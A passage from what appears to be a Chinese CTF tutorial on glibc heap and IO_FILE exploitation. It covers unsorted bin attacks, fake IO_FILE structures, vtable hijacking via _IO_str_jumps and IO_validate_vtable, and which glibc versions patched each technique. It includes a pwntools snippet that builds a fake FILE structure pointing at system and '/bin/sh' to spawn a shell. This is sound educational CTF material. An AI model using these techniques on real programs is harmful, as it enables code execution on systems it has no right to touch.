<span class="comment">/*</span></span><br><span class="line"><span class="comment">               Skip over some bytes to arrive at an aligned position.</span></span><br><span class="line"><span class="comment">               We don&#x27;t need to specially mark these wasted front bytes.</span></span><br><span class="line"><span class="comment">               They will never be accessed anyway because</span></span><br><span class="line"><span class="comment">               prev_inuse of av-&gt;top (and any chunk created from its start)</span></span><br><span class="line"><span class="comment">               is always true after initialization.</span></span><br><span class="line"><span class="comment">             */</span></span><br><span class="line"></span><br><span class="line">            correction = MALLOC_ALIGNMENT - front_misalign;</span><br><span class="line">            aligned_brk += correction;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">           If this isn&#x27;t adjacent to existing space, then we will not</span></span><br><span class="line"><span class="comment">           be able to merge with old_top space, so must add to 2nd request.</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line"></span><br><span class="line">        correction += old_size;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* Extend the end address to hit a page boundary */</span></span><br><span class="line">        end_misalign = (INTERNAL_SIZE_T) (brk + size + correction);</span><br><span class="line">        correction += (ALIGN_UP(end_misalign, pagesize)) - end_misalign;</span><br><span class="line"></span><br><span class="line">        assert(correction &gt;= <span class="number">0</span>);</span><br><span class="line">        snd_brk = (<span class="type">char</span> *) (MORECORE(correction));</span><br><span class="line"></span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">           If can&#x27;t allocate correction, try to at least find out current</span></span><br><span class="line"><span class="comment">           brk.  It might be enough to proceed without failing.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">           Note that if second sbrk did NOT fail, we assume that space</span></span><br><span class="line"><span class="comment">           is contiguous with first sbrk. This is a safe assumption unless</span></span><br><span class="line"><span class="comment">           program is multithreaded but doesn&#x27;t use locks and a foreign sbrk</span></span><br><span class="line"><span class="comment">           occurred between our first and second calls.</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (snd_brk == (<span class="type">char</span> *) (MORECORE_FAILURE)) &#123;</span><br><span class="line">            correction = <span class="number">0</span>;</span><br><span class="line">            snd_brk = (<span class="type">char</span> *) (MORECORE(<span class="number">0</span>));</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">/* Call the `morecore&#x27; hook if necessary.  */</span></span><br><span class="line">            <span class="type">void</span> (*hook)(<span class="type">void</span>) = atomic_forced_read(__after_morecore_hook);</span><br><span class="line">            <span class="keyword">if</span> (__builtin_expect(hook != <span class="literal">NULL</span>, <span class="number">0</span>))</span><br><span class="line">                (*hook)();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* handle non-contiguous cases */</span></span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (MALLOC_ALIGNMENT == <span class="number">2</span> * SIZE_SZ)</span><br><span class="line">            <span class="comment">/* MORECORE/mmap must correctly align */</span></span><br><span class="line">            assert(((<span class="type">unsigned</span> <span class="type">long</span>) chunk2mem(brk) &amp; MALLOC_ALIGN_MASK) == <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            front_misalign = (INTERNAL_SIZE_T) chunk2mem(brk) &amp; MALLOC_ALIGN_MASK;</span><br><span class="line">            <span class="keyword">if</span> (front_misalign &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="comment">/*</span></span><br><span class="line"><span class="comment">                   Skip over some bytes to arrive at an aligned position.</span></span><br><span class="line"><span class="comment">                   We don&#x27;t need to specially mark these wasted front bytes.</span></span><br><span class="line"><span class="comment">                   They will never be accessed anyway because</span></span><br><span class="line"><span class="comment">                   prev_inuse of av-&gt;top (and any chunk created from its start)</span></span><br><span class="line"><span class="comment">                   is always true after initialization.</span></span><br><span class="line"><span class="comment">                 */</span></span><br><span class="line"></span><br><span class="line">                aligned_brk += MALLOC_ALIGNMENT - front_misalign;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* Find out current end of memory */</span></span><br><span class="line">        <span class="keyword">if</span> (snd_brk == (<span class="type">char</span> *) (MORECORE_FAILURE)) &#123;</span><br><span class="line">            snd_brk = (<span class="type">char</span> *) (MORECORE(<span class="number">0</span>));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Adjust top based on results of second sbrk */</span></span><br><span class="line">    <span class="keyword">if</span> (snd_brk != (<span class="type">char</span> *) (MORECORE_FAILURE)) &#123;</span><br><span class="line">        av-&gt;top = (mchunkptr) aligned_brk;</span><br><span class="line">        set_head(av-&gt;top, (snd_brk - aligned_brk + correction) | PREV_INUSE);</span><br><span class="line">        av-&gt;system_mem += correction;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">           If not the first time through, we either have a</span></span><br><span class="line"><span class="comment">           gap due to foreign sbrk or a non-contiguous region.  Insert a</span></span><br><span class="line"><span class="comment">           double fencepost at old_top to prevent consolidation with space</span></span><br><span class="line"><span class="comment">           we don&#x27;t own. These fenceposts are artificial chunks that are</span></span><br><span class="line"><span class="comment">           marked as inuse and are in any case too small to use.  We need</span></span><br><span class="line"><span class="comment">           two to make sizes and alignments work out.</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (old_size != <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="comment">/*</span></span><br><span class="line"><span class="comment">               Shrink old_top to insert fenceposts, keeping size a</span></span><br><span class="line"><span class="comment">               multiple of MALLOC_ALIGNMENT. We know there is at least</span></span><br><span class="line"><span class="comment">               enough space in old_top to do this.</span></span><br><span class="line"><span class="comment">             */</span></span><br><span class="line">            old_size = (old_size - <span class="number">4</span> * SIZE_SZ) &amp; ~MALLOC_ALIGN_MASK;</span><br><span class="line">            set_head(old_top, old_size | PREV_INUSE);</span><br><span class="line"></span><br><span class="line">            <span class="comment">/*</span></span><br><span class="line"><span class="comment">               Note that the following assignments completely overwrite</span></span><br><span class="line"><span class="comment">               old_top when old_size was previously MINSIZE.  This is</span></span><br><span class="line"><span class="comment">               intentional. We need the fencepost, even if old_top otherwise gets</span></span><br><span class="line"><span class="comment">               lost.</span></span><br><span class="line"><span class="comment">             */</span></span><br><span class="line">            chunk_at_offset(old_top, old_size)-&gt;size =</span><br><span class="line">                    (<span class="number">2</span> * SIZE_SZ) | PREV_INUSE;</span><br><span class="line"></span><br><span class="line">            chunk_at_offset(old_top, old_size + <span class="number">2</span> * SIZE_SZ)-&gt;size =</span><br><span class="line">                    (<span class="number">2</span> * SIZE_SZ) | PREV_INUSE;</span><br><span class="line"></span><br><span class="line">            <span class="comment">/* If possible, release the rest. */</span></span><br><span class="line">            <span class="keyword">if</span> (old_size &gt;= MINSIZE) &#123;</span><br><span class="line">                _int_free(av, old_top, <span class="number">1</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="images/0de93e6d5f6cdddac9cd0ff131017791.png"
                      alt="在这里插入图片描述" style="zoom:33%;" 
                >
之后是第二部分。首先修改 unsorted chunk 的 size 为 0x61，并且 bk 字段
指向 <code>_IO_list_all - 0x10</code> ，同时在 chunk 中伪造 IO_FILE
结构体。
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="images/76ec828172cf2b1303c4a64259731550.png"
                      alt="在这里插入图片描述" style="zoom: 25%;" 
                >
之后申请一个大小不等于 0x60 的 chunk 。</p>
<p>程序首先会在 unsorted bin 中寻找合适的 chunk 。由于 bk
已被修改，不满足 <code>bck == unsorted_chunks (av)</code> ，因此不会从该
chunk 中切下合适的 chunk 然后返回。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">while</span> ((victim = unsorted_chunks (av)-&gt;bk) != unsorted_chunks (av))</span><br><span class="line">  &#123;</span><br><span class="line">    size = chunksize (victim);</span><br><span class="line">    ...</span><br><span class="line">    bck = victim-&gt;bk;</span><br><span class="line">    <span class="keyword">if</span> (in_smallbin_range (nb) &amp;&amp;</span><br><span class="line">        bck == unsorted_chunks (av) &amp;&amp;</span><br><span class="line">        victim == av-&gt;last_remainder &amp;&amp;</span><br><span class="line">        (<span class="type">unsigned</span> <span class="type">long</span>) (size) &gt; (<span class="type">unsigned</span> <span class="type">long</span>) (nb + MINSIZE))</span><br></pre></td></tr></table></figure></div>
<p>之后将该 chunk 从 unsorted bin 中取出，从而完成一次 unsorted bin
attack 。由于已经保证申请的 chunk 大小与该 chunk
大小不同，因此不会直接将该 chunk 返回，而是直接放到 small bin 中。
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* remove from unsorted list */</span></span><br><span class="line">unsorted_chunks (av)-&gt;bk = bck;</span><br><span class="line">bck-&gt;fd = unsorted_chunks (av);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Take now instead of binning if exact fit */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (size == nb)</span><br><span class="line">  &#123;</span><br><span class="line">  	...</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* place chunk in bin */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (in_smallbin_range (size))</span><br><span class="line">  &#123;</span><br><span class="line">    victim_index = smallbin_index (size);</span><br><span class="line">    bck = bin_at (av, victim_index);</span><br><span class="line">    fwd = bck-&gt;fd;</span><br><span class="line">  &#125;</span><br><span class="line">...</span><br><span class="line">victim-&gt;bk = bck;</span><br><span class="line">victim-&gt;fd = fwd;</span><br><span class="line">fwd-&gt;bk = victim;</span><br><span class="line">bck-&gt;fd = victim;</span><br></pre></td></tr></table></figure></div> 最终效果如下图所示：
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="images/f1893892a22542008b7e191d2609727c.png"
                      alt="在这里插入图片描述" style="zoom:25%;" 
                >
之后程序进入 unsorted bin 的第二次循环，由于此时 victim 为
<code>_IO_list_all - 0x10</code>，因此不会通过对
<code>victim-&gt;size</code> 的检查，从而进入
<code>malloc_printerr</code> 函数。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">while</span> ((victim = unsorted_chunks (av)-&gt;bk) != unsorted_chunks (av))</span><br><span class="line">  &#123;</span><br><span class="line">    bck = victim-&gt;bk;</span><br><span class="line">    <span class="keyword">if</span> (__builtin_expect (victim-&gt;size &lt;= <span class="number">2</span> * SIZE_SZ, <span class="number">0</span>)</span><br><span class="line">        || __builtin_expect (victim-&gt;size &gt; av-&gt;system_mem, <span class="number">0</span>))</span><br><span class="line">      malloc_printerr (check_action, <span class="string">&quot;malloc(): memory corruption&quot;</span>,</span><br><span class="line">                       chunk2mem (victim), av);</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
<p>最终，程序会遍历 <code>_IO_list_all</code> 对应的 IO_FILE
链表，并且如果 IO_FILE 结构体满足
<code>fp-&gt;_mode &lt;= 0 &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base</code>
会调用对应 vtable 中的 <code>_IO_overflow</code> 函数，从而获得 shell 。
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span></span><br><span class="line"><span class="title function_">malloc_printerr</span> <span class="params">(<span class="type">int</span> action, <span class="type">const</span> <span class="type">char</span> *str, <span class="type">void</span> *ptr, mstate ar_ptr)</span></span><br><span class="line">&#123;</span><br><span class="line">  ...</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (action &amp; <span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      ...</span><br><span class="line">      __libc_message (action &amp; <span class="number">2</span>, <span class="string">&quot;*** Error in `%s&#x27;: %s: 0x%s ***\n&quot;</span>,</span><br><span class="line">                      __libc_argv[<span class="number">0</span>] ? : <span class="string">&quot;&lt;unknown&gt;&quot;</span>, str, cp);</span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Abort with an error message.  */</span></span><br><span class="line"><span class="type">void</span></span><br><span class="line">__libc_message (<span class="type">int</span> do_abort, <span class="type">const</span> <span class="type">char</span> *fmt, ...)</span><br><span class="line">&#123;</span><br><span class="line">  ...</span><br><span class="line">  <span class="keyword">if</span> (do_abort)</span><br><span class="line">    &#123;</span><br><span class="line">      ...</span><br><span class="line">      <span class="built_in">abort</span> ();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> fflush(s) _IO_flush_all_lockp (0)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Cause an abnormal program termination with core-dump.  */</span></span><br><span class="line"><span class="type">void</span></span><br><span class="line"><span class="title function_">abort</span> <span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">  ...</span><br><span class="line">  <span class="comment">/* Flush all streams.  We cannot close them now because the user</span></span><br><span class="line"><span class="comment">     might have registered a handler for SIGABRT.  */</span></span><br><span class="line">  <span class="keyword">if</span> (stage == <span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      ++stage;</span><br><span class="line">      fflush (<span class="literal">NULL</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">int</span></span><br><span class="line">_IO_flush_all_lockp (<span class="type">int</span> do_lock)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> result = <span class="number">0</span>;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> *<span class="title">fp</span>;</span></span><br><span class="line">  <span class="type">int</span> last_stamp;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _IO_MTSAFE_IO</span></span><br><span class="line">  __libc_cleanup_region_start (do_lock, flush_cleanup, <span class="literal">NULL</span>);</span><br><span class="line">  ...</span><br><span class="line">  fp = (_IO_FILE *) _IO_list_all;</span><br><span class="line">  <span class="keyword">while</span> (fp != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      run_fp = fp;</span><br><span class="line">      <span class="keyword">if</span> (do_lock)</span><br><span class="line">	_IO_flockfile (fp);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (((fp-&gt;_mode &lt;= <span class="number">0</span> &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base)</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> defined _LIBC || defined _GLIBCPP_USE_WCHAR_T</span></span><br><span class="line">	   || (_IO_vtable_offset (fp) == <span class="number">0</span></span><br><span class="line">	       &amp;&amp; fp-&gt;_mode &gt; <span class="number">0</span> &amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_ptr</span><br><span class="line">				    &gt; fp-&gt;_wide_data-&gt;_IO_write_base))</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">      )</span><br><span class="line">      &amp;&amp; _IO_OVERFLOW (fp, EOF) == EOF)</span><br><span class="line">	  result = EOF;</span><br><span class="line">      ...</span><br><span class="line">      fp = fp-&gt;_chain;</span><br><span class="line">    &#125;</span><br><span class="line">  ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div> 自 glibc-2.27 开始，abort 函数发生较大改动，不再调用
<code>_IO_flush_all_lockp</code> 函数，因此不能利用 malloc_printerr
实现程序执行流劫持。 ## 劫持 vtable 到 _IO_str_jumps 以这道<a class="link" 
 href="https://gitcode.net/qq_45323960/attachment/-/tree/master/glibc_pwn/VN2020CTF_easyTHEAP" >题目 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>为例，libc2.24
在 <code>IO_validate_vtable</code> 函数中对 <code>*vtable</code>
指针进行校验，<code>vtable</code> 必须要满足 在
<code>__stop___IO_vtables</code> 和
<code>__start___libc_IO_vtables</code> 之间，而我们伪造的
<code>vtable</code> 通常不满足这个条件。 但是 <code>_IO_str_jumps</code>
与 <code>__IO_wstr_jumps</code> 就位于
<code>__stop___libc_IO_vtables</code> 和
<code>__start___libc_IO_vtables</code>
之间，所以我们是可以利用他们来通过 <code>IO_validate_vtable</code>
的检测的,只需要将 <code>*vtable</code> 填成 <code>_IO_str_jumps</code>
或 <code>__IO_wstr_jumps</code> 地址即可。 <code>_IO_str_jumps</code>
同样是 <code>_IO_jump_t</code> 类型，但是与与原来的 <code>vtable</code>
指向的 <code>__GI__IO_file_jumps</code> 相比指向的函数不同。 <img 

                     lazyload
                     src="/images/loading.svg"
                     data-src="images/c7d9dd92c1701cea6ee1e0efca16f645.png"
                     
alt="在这里插入图片描述" 
                > <code>_IO_str_jumps</code> 其中的
<code>_IO_str_finish</code> 直到 libc-2.27
版本都是下面这种实现手段。也就是说，如果修改
<code>((_IO_strfile *) fp)-&gt;_s._free_buffer</code> 为
<code>system</code> 地址，然后修改 <code>fp-&gt;_IO_buf_base</code> 为
<code>/bin/sh</code> 字符串地址，然后触发程序执行
<code>_IO_str_finish</code> 函数就可以得到 shell 。 <div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line">_IO_str_finish (_IO_FILE *fp, <span class="type">int</span> dummy)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_buf_base &amp;&amp; !(fp-&gt;_flags &amp; _IO_USER_BUF))</span><br><span class="line">    (((_IO_strfile *) fp)-&gt;_s._free_buffer) (fp-&gt;_IO_buf_base);</span><br><span class="line">  fp-&gt;_IO_buf_base = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">  _IO_default_finish (fp, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
要想触发程序执行 <code>_IO_str_finish</code> 函数就需要将
<code>vtable</code> 指向 <code>_IO_str_jumps</code>
往上的某个偏移，使得下一个要调用的 <code>vtable</code>
中的函数（最好是第一个被调用的函数，因为 <code>vtable</code>
已经被破坏）的位置恰好是 <code>_IO_str_finish</code> 。 由于 edit 函数在
<code>read</code> 改完 <code>_IO_2_1_stdout_</code> 后紧接着调用
<code>printf</code>，而 <code>printf</code> 紧接着会调用
<code>_IO_new_file_xsputn</code> ，因此需要将 <code>vtable</code> 指向
<code>&amp;_IO_str_jumps - 0x28</code> 的位置上。<img 

                     lazyload
                     src="/images/loading.svg"
                     data-src="images/dfc6e89aed90a3a4793adbde3d4f7376.png"
                     
alt="在这里插入图片描述" 
                ></p>
<p>IO_FILE 的伪造对应与代码中可以有如下定义： <div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># find _IO_str_jumps</span></span><br><span class="line">IO_file_jumps = libc.symbols[<span class="string">&#x27;_IO_file_jumps&#x27;</span>]</span><br><span class="line">IO_str_underflow = libc.symbols[<span class="string">&#x27;_IO_str_underflow&#x27;</span>] - libc.address</span><br><span class="line">IO_str_underflow_ptr = <span class="built_in">list</span>(libc.search(p64(IO_str_underflow)))</span><br><span class="line">IO_str_jumps = IO_str_underflow_ptr[bisect_left(IO_str_underflow_ptr, IO_file_jumps + <span class="number">0x20</span>)] - <span class="number">0x20</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># construct the fake file structure</span></span><br><span class="line">fake_file = <span class="string">b&quot;&quot;</span></span><br><span class="line">fake_file += p64(<span class="number">0xFBAD2886</span>)  <span class="comment"># _flags, an magic word, we need to (0xFBAD2887 &amp; (~0x1)) to clear the _IO_USER_BUF flag to pass the check in _IO_str_finish</span></span><br><span class="line">fake_file += p64(libc.sym[<span class="string">&#x27;_IO_2_1_stdout_&#x27;</span>] + <span class="number">131</span>) * <span class="number">6</span>  <span class="comment"># from _IO_read_ptr to _IO_write_end</span></span><br><span class="line">fake_file += p64(libc.search(<span class="string">&quot;/bin/sh&quot;</span>).<span class="built_in">next</span>())  <span class="comment"># _IO_buf_base -&gt; &quot;/bin/sh&quot;</span></span><br><span class="line">fake_file += p64(libc.sym[<span class="string">&#x27;_IO_2_1_stdout_&#x27;</span>] + <span class="number">132</span>)  <span class="comment"># _IO_buf_end should usually be (_IO_buf_base + 1)</span></span><br><span class="line">fake_file += p64(<span class="number">0</span>) * <span class="number">4</span>  <span class="comment"># from _IO_save_base to _markers</span></span><br><span class="line">fake_file += p64(libc.sym[<span class="string">&#x27;_IO_2_1_stdin_&#x27;</span>])  <span class="comment"># the FILE chain ptr</span></span><br><span class="line">fake_file += p32(<span class="number">1</span>)  <span class="comment"># _fileno for stdout is 1</span></span><br><span class="line">fake_file += p32(<span class="number">0</span>)  <span class="comment"># _flags2, usually 0</span></span><br><span class="line">fake_file += p64(<span class="number">0xFFFFFFFFFFFFFFFF</span>)  <span class="comment"># _old_offset, -1</span></span><br><span class="line">fake_file += p16(<span class="number">0</span>)  <span class="comment"># _cur_column</span></span><br><span class="line">fake_file += <span class="string">b&quot;\x00&quot;</span>  <span class="comment"># _vtable_offset</span></span><br><span class="line">fake_file += <span class="string">b&quot;\n&quot;</span>  <span class="comment"># _shortbuf[1]</span></span><br><span class="line">fake_file += p32(<span class="number">0</span>)  <span class="comment"># padding</span></span><br><span class="line">fake_file += p64(libc.sym[<span class="string">&#x27;_IO_2_1_stdout_&#x27;</span>] + <span class="number">0x1e20</span>)  <span class="comment"># _IO_stdfile_1_lock</span></span><br><span class="line">fake_file += p64(<span class="number">0xFFFFFFFFFFFFFFFF</span>)  <span class="comment"># _offset, -1</span></span><br><span class="line">fake_file += p64(<span class="number">0</span>)  <span class="comment"># _codecvt, usually 0</span></span><br><span class="line">fake_file += p64(libc.sym[<span class="string">&#x27;_IO_2_1_stdout_&#x27;</span>] - <span class="number">0xe20</span>)  <span class="comment"># _IO_wide_data_1</span></span><br><span class="line">fake_file += p64(<span class="number">0</span>) * <span class="number">3</span>  <span class="comment"># from _freeres_list to __pad5</span></span><br><span class="line">fake_file += p32(<span class="number">0xFFFFFFFF</span>)  <span class="comment"># _mode, -1</span></span><br><span class="line">fake_file += <span class="string">b&quot;\x00&quot;</span> * <span class="number">19</span>  <span class="comment"># _unused2</span></span><br><span class="line">fake_file = fake_file.ljust(<span class="number">0xD8</span>, <span class="string">b&#x27;\x00&#x27;</span>)  <span class="comment"># adjust to vtable</span></span><br><span class="line">fake_file += p64(IO_str_jumps - <span class="number">0x28</span>) + p64(<span class="number">0</span>) + p64(libc.sym[<span class="string">&#x27;system&#x27;</span>])  <span class="comment"># set the vtable to _IO_str_jumps - 0x28 and set the _IO_2_1_stdout_ + 0xe8 to one_gadget</span></span><br></pre></td></tr></table></figure></div> libc-2.28
版本起 _IO_str_finish 不再调用 _free_buffer 而是直接是直接调用 free
，因此该方法失效。 <div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line">_IO_str_finish (FILE *fp, <span class="type">int</span> dummy)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_buf_base &amp;&amp; !(fp-&gt;_flags &amp; _IO_USER_BUF))</span><br><span class="line">    <span class="built_in">free</span> (fp-&gt;_IO_buf_base);</span><br><span class="line">  fp-&gt;_IO_buf_base = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">  _IO_default_finish (fp, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div> ## 利用 IO_validate_vtable 劫持程序流
以<a class="link" 
 href="https://gitcode.net/qq_45323960/attachment/-/tree/master/glibc_pwn/33%20xl" >这道题 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>为例，自
glibc-2.24 起在调用 <code>vtable</code> 中的函数前会调用
<code>IO_validate_vtable</code> 检查 <code>vtable</code> 执向的
<code>_IO_jump_t</code> 的地址是否合法，</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">const</span> <span class="keyword">struct</span> _IO_jump_t *<span class="title function_">IO_validate_vtable</span><span class="params">(<span class="type">const</span> <span class="keyword">struct</span> _IO_jump_t *vtable)</span> &#123;</span><br><span class="line">    <span class="comment">/* Fast path: The vtable pointer is within the __libc_IO_vtables</span></span><br><span class="line"><span class="comment">       section.  */</span></span><br><span class="line">    <span class="type">uintptr_t</span> section_length = __stop___libc_IO_vtables - __start___libc_IO_vtables;</span><br><span class="line">    <span class="type">uintptr_t</span> ptr = (<span class="type">uintptr_t</span>) vtable;</span><br><span class="line">    <span class="type">uintptr_t</span> offset = ptr - (<span class="type">uintptr_t</span>) __start___libc_IO_vtables;</span><br><span class="line">    <span class="keyword">if</span> (__glibc_unlikely (offset &gt;= section_length))</span><br><span class="line">        <span class="comment">/* The vtable pointer is not in the expected section.  Use the</span></span><br><span class="line"><span class="comment">           slow path, which will terminate the process if necessary.  */</span></span><br><span class="line">        _IO_vtable_check();</span><br><span class="line">    <span class="keyword">return</span> vtable;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> attribute_hidden _IO_vtable_check(<span class="type">void</span>) &#123;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> SHARED</span></span><br><span class="line">    <span class="comment">/* Honor the compatibility flag.  */</span></span><br><span class="line">    <span class="type">void</span> (*flag)(<span class="type">void</span>) = atomic_load_relaxed (&amp;IO_accept_foreign_vtables);</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> PTR_DEMANGLE</span></span><br><span class="line">    PTR_DEMANGLE (flag);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    <span class="keyword">if</span> (flag == &amp;_IO_vtable_check)</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* In case this libc copy is in a non-default namespace, we always</span></span><br><span class="line"><span class="comment">       need to accept foreign vtables because there is always a</span></span><br><span class="line"><span class="comment">       possibility that FILE * objects are passed across the linking</span></span><br><span class="line"><span class="comment">       boundary.  */</span></span><br><span class="line">    &#123;</span><br><span class="line">        Dl_info di;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">link_map</span> *<span class="title">l</span>;</span></span><br><span class="line">        <span class="keyword">if</span> (!rtld_active()</span><br><span class="line">            || (_dl_addr(_IO_vtable_check, &amp;di, &amp;l, <span class="literal">NULL</span>) != <span class="number">0</span></span><br><span class="line">                &amp;&amp; l-&gt;l_ns != LM_ID_BASE))</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">bool</span> <span class="title function_">rtld_active</span> <span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">  <span class="comment">/* The default-initialized variable does not have a non-zero</span></span><br><span class="line"><span class="comment">     dl_init_all_dirs member, so this allows us to recognize an</span></span><br><span class="line"><span class="comment">     initialized and active ld.so copy.  */</span></span><br><span class="line">  <span class="keyword">return</span> GLRO(dl_init_all_dirs) != <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> _dl_addr(<span class="type">const</span> <span class="type">void</span> *address, Dl_info *info, <span class="keyword">struct</span> link_map **mapp, <span class="type">const</span> ElfW(Sym) **symbolp) &#123;</span><br><span class="line">    <span class="type">const</span> <span class="title function_">ElfW</span><span class="params">(Addr)</span> addr = DL_LOOKUP_ADDRESS (address);</span><br><span class="line">    <span class="type">int</span> result = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Protect against concurrent loads and unloads.  */</span></span><br><span class="line">    __rtld_lock_lock_recursive (GL(dl_load_lock));</span><br><span class="line">    ...</span><br><span class="line">        </span><br><span class="line"></span><br><span class="line">声明位置: libc-lockP.h  </span><br><span class="line"> 定义:  </span><br><span class="line"><span class="meta"># <span class="keyword">define</span> __rtld_lock_lock_recursive(NAME) \</span></span><br><span class="line"><span class="meta">  __libc_maybe_call (__pthread_mutex_lock, (&amp;(NAME).mutex), 0)</span></span><br><span class="line"> 替换:  </span><br><span class="line">((&#123;</span><br><span class="line">    __typeof(__pthread_mutex_lock) *_fn = (__pthread_mutex_lock);</span><br><span class="line">    _fn != ((<span class="type">void</span> *) <span class="number">0</span>) ? (*_fn)(&amp;(_dl_load_lock).mutex) : <span class="number">0</span>;</span><br><span class="line">&#125;))</span><br></pre></td></tr></table></figure></div>
<p>可以看到，如果 <code>rtld_active</code> 返回
true（具体看调试，因为可能存在<code>GLRO(dl_init_all_dirs)</code>不可写且为
NULL 的情况）则</p>
<p>会调用 <code>_dl_addr</code>，最终执行
<code>__rtld_lock_lock_recursive (GL(dl_load_lock))</code> ，这个宏就是
exit hook 对应的宏，因此可以像 exit hook
那样修改函数指针就可以劫持程序流。</p>
<p>同样的，glibc-2.34 起该方法失效。 ## House of Husk 在 glibc
中，可以通过 <code>__register_printf_function</code> 函数为
<code>printf</code> 格式化字符串中的 <code>spec</code> （例如
<code>%X</code> 中的
